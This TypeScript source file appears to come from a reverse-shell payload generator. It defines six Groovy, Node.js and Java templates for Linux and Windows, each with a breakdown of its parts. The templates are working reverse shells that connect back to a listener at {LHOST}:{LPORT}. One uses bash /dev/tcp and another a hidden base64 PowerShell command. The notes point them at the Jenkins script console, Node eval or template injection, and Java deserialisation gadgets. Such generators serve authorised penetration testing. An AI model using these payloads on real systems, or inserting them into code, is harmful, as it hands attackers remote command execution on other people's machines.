import type { ListenerId, PayloadDef } from "./types";

const REVERSE: ListenerId[] = ["penelope", "rlwrap-nc"];
const groovy = (cmd: string) =>
  `String host="{LHOST}";int port={LPORT};String cmd="${cmd}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();`;
const groovyParts = (cmd: string) => [
  { token: `String cmd="${cmd}"`, explain: "The shell to start on the target." },
  { token: "new ProcessBuilder(cmd)", explain: "Starts that shell as a child process of the JVM." },
  { token: "new Socket(host,port)", explain: "Opens the TCP connection back to your listener." },
  { token: "Thread.sleep(50)", explain: "Pauses between copy passes so the loop does not spin the CPU." },
];
const node = (sh: string) =>
  `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("${sh}",[]);var client=new net.Socket();client.connect({LPORT},"{LHOST}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`;
const nodeParts = (sh: string) => [
  { token: `cp.spawn("${sh}",[])`, explain: "Starts the shell as a child process." },
  { token: "client.connect(", explain: "Opens the TCP connection back to your listener." },
  { token: "client.pipe(sh.stdin)", explain: "Feeds what you type into the shell." },
  { token: "sh.stdout.pipe(client)", explain: "Sends the shell's output (and, on the next line, errors) back to you." },
  { token: "return /a/;", explain: "Returns a harmless regex so a host that expects a value from the snippet does not crash and kill the connection." },
];

export const CODE_SHELLS: PayloadDef[] = [
  {
    id: "groovy-linux", generator: "shell", title: "Groovy ProcessBuilder (Linux)", os: "linux",
    contexts: ["groovy"], requires: ["bash"], template: groovy("/bin/bash"), parts: groovyParts("/bin/bash"), listeners: REVERSE,
    notes: ["Used in the Jenkins /script console or any Groovy console: paste it there, not into a shell."],
  },
  {
    id: "groovy-windows", generator: "shell", title: "Groovy ProcessBuilder (Windows)", os: "windows",
    contexts: ["groovy"], requires: [], template: groovy("cmd.exe"), parts: groovyParts("cmd.exe"), listeners: REVERSE,
    notes: ["Used in the Jenkins /script console or any Groovy console on a Windows host."],
  },
  {
    id: "node-linux", generator: "shell", title: "Node child_process (Linux)", os: "linux",
    contexts: ["node"], requires: [], template: node("/bin/sh"), parts: nodeParts("/bin/sh"), listeners: REVERSE,
    notes: ["Used where Node evaluates your input: eval-style RCE or SSTI in a Node template engine."],
  },
  {
    id: "node-windows", generator: "shell", title: "Node child_process (Windows)", os: "windows",
    contexts: ["node"], requires: [], template: node("cmd.exe"), parts: nodeParts("cmd.exe"), listeners: REVERSE,
    notes: ["Used where Node evaluates your input on a Windows host."],
  },
  {
    id: "java-linux", generator: "shell", title: "Java Runtime.exec (Linux)", os: "linux",
    contexts: ["java"], requires: ["bash"], listeners: REVERSE,
    template: `Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"});`,
    parts: [
      { token: "Runtime.getRuntime().exec(", explain: "Starts an OS process from Java." },
      { token: "new String[]{", explain: "An array, not one string: a single string does not use a shell, so the redirects would fail." },
      { token: "\"-c\"", explain: "-c: run the next string as a bash command line." },
      { token: "/dev/tcp/", explain: "Bash's built-in pseudo-device that opens the TCP connection; why the shell is bash, not sh." },
    ],
    notes: ["Used for Java deserialisation or expression-injection gadgets that take one Java statement."],
  },
  {
    id: "java-windows", generator: "shell", title: "Java Runtime.exec (Windows)", os: "windows",
    contexts: ["java"], requires: [], listeners: REVERSE,
    template: `Runtime.getRuntime().exec("powershell -nop -w hidden -e {PS_B64}");`,
    parts: [
      { token: "Runtime.getRuntime().exec(", explain: "Starts an OS process from Java." },
      { token: "-nop", explain: "No profile: skips the user's PowerShell profile." },
      { token: "-w hidden", explain: "Hides the window." },
      { token: "powershell -nop -w hidden -e", explain: "Runs the UTF-16LE base64 script, which has no quotes to break the Java string." },
    ],
    notes: ["Used for Java gadgets on a Windows host; avoids anything that depends on jjs.exe (gone in Java 15+)."],
  },
];
